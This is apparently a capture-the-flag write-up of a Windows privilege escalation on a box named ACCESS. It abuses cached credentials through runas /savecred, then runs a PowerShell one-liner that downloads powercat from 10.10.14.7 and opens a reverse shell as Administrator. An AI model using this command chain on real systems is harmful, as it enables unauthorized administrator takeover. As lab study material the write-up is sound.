Under `C:\Users\Public\Desktop` found a .lnk file running a program in `C:\ZKTeco` using `runas.exe`. This program is being run as Administrator using the /savecred feature that is part of `runas.exe`. This means that we can use the same method to execute `runas` as Admin.

- Confirm if Admin creds are cached
```bash
cmdkey /list
```
This lists cached credentials

```powershell
runas /env /noprofile /savecred /user:ACCESS\Administrator "powershell.exe -c \"IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.7/powercat.ps1'); powercat -c 10.10.14.7 -p 443 -e cmd\""
```
![[Pasted image 20240906175325.png]]

Got a shell as `access\administrator`
